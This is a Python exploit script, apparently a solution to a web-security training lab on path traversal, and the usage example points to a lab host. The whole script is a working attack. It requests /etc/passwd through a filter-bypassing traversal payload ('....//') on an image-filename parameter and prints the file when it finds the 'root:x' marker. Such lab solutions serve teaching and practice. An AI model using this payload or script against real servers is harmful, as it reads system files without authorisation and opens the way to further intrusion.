import sys
import requests
from requests.adapters import HTTPAdapter, Retry



def exploit_path_traversal(url, session):
    response = session.get(f"{url}/image?filename=....//....//....//etc/passwd", timeout=10)
    if "root:x" in response.text:
        return response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

        print("(+) Retrieving the contents of the /etc/passwd file...")
        passwd_file = exploit_path_traversal(url, session)
        if passwd_file:
            print(passwd_file)
        else:
            print("(-) Something went wrong. Please check your URL and try again.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")


if __name__ == "__main__":
    main()